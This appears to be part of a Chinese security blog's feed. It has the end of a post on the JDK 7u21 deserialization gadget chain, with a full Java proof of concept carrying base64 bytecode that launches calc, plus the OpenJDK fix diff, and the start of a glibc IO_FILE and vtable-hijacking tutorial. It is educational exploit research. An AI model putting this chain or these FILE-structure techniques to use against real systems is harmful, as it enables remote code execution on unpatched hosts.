<p>而 <code>equalsImpl</code> 方法可以通过 <code>AnnotationInvocationHandler#invoke</code> 方法调用。也就是说如果我们使用 <code>AnnotationInvocationHandler#invoke</code> 代理一个类，然后调用这个类的 <code>equals</code> 方法就可以触发 <code>AnnotationInvocationHandler#equalsImpl</code> 方法调用，且传入的参数是 <code>equals</code> 的参数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HashSet</code> 内部实际上是通过 <code>HashMap</code> 来实现的，我们存入 <code>HashSet</code> 中的数据实际上是存入内部成员 <code>private transient HashMap&lt;E,Object&gt; map;</code> 的键中，而对应的值设为一个 <code>Object</code> 类型的对象来占位（<del>真够懒的</del>）。因此在 <code>HashSet#readObject</code> 函数中我们会把 <code>HashSet</code> 存储的元素逐个加到 <code>HashMap</code> 中。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>HashMap</code> 中会计算哈希值找到对应的桶然后逐个比较去重，最后放到 <code>HashMap</code> 中。这里涉及到了 <code>equals</code> 方法的调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       </span><br><span class="line">       ...</span><br><span class="line">       </span><br><span class="line">       h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">       <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">       <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">       h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">       <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">           Object k;</span><br><span class="line">           <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">               <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">               e.value = value;</span><br><span class="line">               e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">               <span class="keyword">return</span> oldValue;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       modCount++;</span><br><span class="line">       addEntry(hash, key, value, i);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们在 <code>HashSet</code> 中放一个 <code>TemplatesImpl</code> 对象再放一个 <code>AnnotationInvocationHandler</code> 代理的对象，并且恰巧这两个对象的哈希值相等且 <code>AnnotationInvocationHandler</code> 代理的对象是后加入的，那么调用 <code>equals</code> 方法就会触发前面介绍的利用链。</p>
<p>所以现在的问题是如何构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得其哈希值与 <code>TemplatesImpl</code> 对象相等。</p>
<p>由于 <code>TemplatesImpl</code> 没有显式实现 <code>hashCode()</code> 方法，因此它将继承自 <code>java.lang.Object</code> 类中的默认实现。在这种情况下，调用 <code>hashCode()</code> 方法返回的是该对象的内存地址经过哈希计算后得到的一个整数值。也就是说这个哈希值我们不可控制。</p>
<p>但是我们可以想办法构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得它的哈希值总是与 <code>TemplatesImpl</code> 对象的哈希值相等。 </p>
<p><code>AnnotationInvocationHandler</code> 代理的对象的 <code>hashCode</code> 方法实际上调用的是 <code>AnnotationInvocationHandler#invoke</code> 进而会调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code>。</p>
<p>这个方法会遍历 <code>memberValues</code> 这个 <code>Map</code> 中的每个 <code>key</code> 和 <code>value</code>，计算每个 <code>(127 * key.hashCode()) ^ value.hashCode()</code> 并求和。因此我们只要让 <code>value</code> 为<strong>同一个</strong> <code>TemplatesImpl</code> 且 <code>key</code> 的哈希值为 0 即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">        result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">            memberValueHashCode(e.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>网上通常的做法是枚举十六进制数字对应的字符串，最终得到 <code>f5a5a608</code> 这个字符串。但实际上根据字符串的哈希计算方式很容易就构造出 <code>\0</code> 这一字符串。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADMANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhDAAKAAsHADAMADEAMgEABGNhbGMMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQAeY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAALAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAXAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAcAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADgAJABEADAAPAA0AEAAWABIADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span>  clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">proxy</span> <span class="operator">=</span> (Serializable) Proxy.newProxyInstance(Serializable.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Serializable.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, templates);</span><br><span class="line">        System.out.println(proxy.hashCode());</span><br><span class="line">        System.out.println(templates.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(set);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:136, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:339, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:376, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">equals:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">put:475, HashMap (java.util)</span><br><span class="line">readObject:309, HashSet (java.util)</span><br><span class="line">...</span><br><span class="line">main:48, JDK7u21 (com.example)</span><br></pre></td></tr></table></figure></div>
<p> <a class="link"   href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350" >https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Fri Mar 22 15:40:16 2013 -0400</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Mon Mar 25 12:41:55 2013 +0400</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,5 @@</span></span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="addition">+ * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line">  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.</span><br><span class="line">  *</span><br><span class="line">  * This code is free software; you can redistribute it and/or modify it</span><br><span class="line"><span class="meta">@@ -337,12 +337,15 @@</span></span><br><span class="line">         try &#123;</span><br><span class="line">             annotationType = AnnotationType.getInstance(type);</span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="deletion">-            // Class is no longer an annotation type; all bets are off</span></span><br><span class="line"><span class="deletion">-            return;</span></span><br><span class="line"><span class="addition">+            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="addition">+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        // If there are annotation members without values, that</span></span><br><span class="line"><span class="addition">+        // situation is handled by the invoke method.</span></span><br><span class="line">         for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>linux IO_FILE 利用</title>
    <url>/2024/11/08/linux-IO_FILE-exploit/</url>
    <content><![CDATA[<h1 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h1><p>IO FILE 定义的各种主要结构关系如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/ea5063408b268d86b52ecebe0894e2b9.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li><p>各种文件结构采用单链表的形式连接起来，通过 <code>_IO_list_all</code> 访问。</p>
</li>
<li><p><code>vatble</code> 为函数指针结构体，存放着各种 IO 相关的函数的指针。</p>
</li>
<li><p>初始情况下 <code>_IO_FILE</code> 结构有 <code>_IO_2_1_stderr_</code> ，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin_</code> 三个，通过 <code>_IO_list_all</code> 将这三个结构。</p>
  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">  static _IO_lock_t _IO_stdfile_##FD##_lock = _IO_lock_initializer; \</span></span><br><span class="line"><span class="meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span></span><br><span class="line"><span class="meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span></span><br><span class="line"><span class="meta">  struct _IO_FILE_plus NAME \</span></span><br><span class="line"><span class="meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span></span><br><span class="line"><span class="meta">       &amp;_IO_file_jumps&#125;</span></span><br><span class="line">       </span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br><span class="line">libc_hidden_data_def (_IO_list_all)</span><br></pre></td></tr></table></figure></div>
<p>  并且存在 3 个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code> 分别指向  <code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code> 三个结构体。</p>
  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div>
<p>  因此上述结构的关系如下：<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/d2828352a7bf33e05ffd15edc47ac75f.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>果有文件读写操作则会为对应文件创建一个 <code>_IO_FILE</code> 结构体，并且链接到 <code>_IO_list_all</code> 链表上。</p>
  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1dee20e9043550b64dc1b3d0fe347f8c.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/aaaf2aef59974194e0c422c8173f20d3.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>缓冲区如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2fa5c22dfa9505ebfcd7cea0e06b1fab.png"
                      alt="在这里插入图片描述" style="zoom: 67%;" 
                ></p>
<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cb0f0f01fc0497ec52772692b313d463.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ><br>缓冲区如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1763f1198512dc8f9468f862784f8dfa.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ></p>
<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/93c639d6e1c30c3a6d70c3d94b653839.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="利用-fileno-字段泄露数据"><a href="#利用-fileno-字段泄露数据" class="headerlink" title="利用 _fileno 字段泄露数据"></a>利用 _fileno 字段泄露数据</h1><p><code>_fileno</code> 的值就是文件描述符，位于 stdin 文件结构开头 0x70 偏移处，比如： stderr 的 <code>fileno</code> 值为2，stdout 的 <code>fileno</code> 值为 1 。在漏洞利用中可以通过修改 <code>stdin</code> 的 <code>_fileno</code> 值来重定位需要读取的文件，本来为 0 的话表示从标准输入中读取，修改为 4 则表示为从文件描述符为 4 的文件中读取，这里利用这个点可以直接读取 flag 。</p>
<h1 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h1><p> <code>vtable</code> 劫持分为两种，一种是直接改写 <code>vtable</code> 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 <code>vtable</code> 的指针指向我们控制的内存，然后在其中布置函数指针。由于 <code>vtable</code> 一般都不可修改，所以第一种方式不太常见。<br><strong>注意： <code>vtable</code> 是否可写跟 libc 有关，而且有的高版本 libc 反而可写，比如下面这个 glibc-2.34。</strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/f06cdc377965e91d972da30e477f6abd.png"
                      alt="在这里插入图片描述"
                ><br>在 libc2.24 版本之前由于没有 <code>_IO_vtable_check</code> 检查 <code>vtable</code> 地址，因此可以通过伪造 <code>vtable</code> 来调用所需函数 。</p>
<p> IO 调用的 vtable 函数：</p>
<p><code>fopen</code> 函数是在分配空间，建立 <code>FILE</code> 结构体，未调用 <code>vtable</code> 中的函数。</p>
<p><code>fread</code> 函数中调用的 <code>vtable</code> 函数有：</p>
<ul>
<li><code>_IO_sgetn</code> 函数调用了 <code>vtable</code> 的 <code>_IO_file_xsgetn</code> 。</li>
<li><code>_IO_doallocbuf</code> 函数调用了 <code>vtable</code> 的 <code>_IO_file_doallocate</code> 以初始化输入缓冲区。</li>
<li><code>vtable</code> 中的 <code>_IO_file_doallocate</code> 调用了 <code>vtable</code> 中的 <code>__GI__IO_file_stat</code> 以获取文件信息。</li>
